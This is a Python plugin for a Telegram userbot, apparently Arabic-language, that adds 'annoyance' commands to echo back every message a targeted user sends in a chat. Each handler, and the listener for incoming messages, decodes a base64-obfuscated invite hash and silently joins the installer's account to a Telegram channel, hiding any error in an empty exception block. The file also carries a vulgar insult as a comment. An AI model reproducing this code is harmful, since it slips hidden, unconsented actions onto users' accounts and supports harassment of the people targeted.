import asyncio
import base64

import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from .sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
from . import Echo, M

@icssbot.on(icss_cmd(pattern="الازعاج$"))
@icssbot.on(sudo_cmd(pattern="الازعاج$", allow_sudo=True))
async def _(e):
    if e.fwd_from:
        return
    if e.reply_to_msg_id is not None:
        reply_msg = await e.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = e.chat_id
        try:
            hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await e.client(hmm)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await eor(e, Echo[0].format(M))
            return
        addecho(user_id, chat_id)
        await eor(e, Echo[1])
    else:
        await eor(e, Echo[2].format(M))

# خمط كسمك 

@icssbot.on(icss_cmd(pattern="الغاء الازعاج$"))
@icssbot.on(sudo_cmd(pattern="الغاء الازعاج$", allow_sudo=True))
async def _(e):
    if e.fwd_from:
        return
    if e.reply_to_msg_id is not None:
        reply_msg = await e.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = e.chat_id
        try:
            hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await e.client(hmm)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await eor(e, Echo[3].format(M))
        else:
            await eor(e, Echo[4].format(M))
    else:
        await eor(e, Echo[2].format(M))


@icssbot.on(admin_cmd(pattern="قائمة الازعاج$"))
@icssbot.on(sudo_cmd(pattern="قائمة الازعاج $", allow_sudo=True))
async def _(e):
    if e.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = Echo[5]
        for echos in lsts:
            output_str += Echo[6].format(echos.user_id, echos.chat_id)
    else:
        output_str = Echo[7].format(M)
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = "**⌔∮ قائمة المضافين للازعاج:** [here]({})".format(url)
        await eor(e, reply_text)
    else:
        await eor(e, output_str)


@icssbot.on(events.NewMessage(incoming=True))
async def samereply(e):
    if e.chat_id in Config.UB_BLACK_LIST_CHAT:
        return
    if is_echo(e.sender_id, e.chat_id):
        await asyncio.sleep(2)
        try:
            hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await e.client(hmm)
        except BaseException:
            pass
        if e.message.text or e.message.sticker:
            await e.reply(e.message)


CMD_HELP.update(
    {
        "echo": "**Syntax :** `.addecho` reply to user to whom you want to enable\
    \n**Usage : **replays his every message for whom you enabled echo\
    \n\n**Syntax : **`.rmecho` reply to user to whom you want to stop\
    \n**Usage : **Stops replaying his messages\
    \n\n**Syntax : **`.listecho`\
    \n**Usage : **shows the list of users for whom you enabled echo\
    "
    }
)
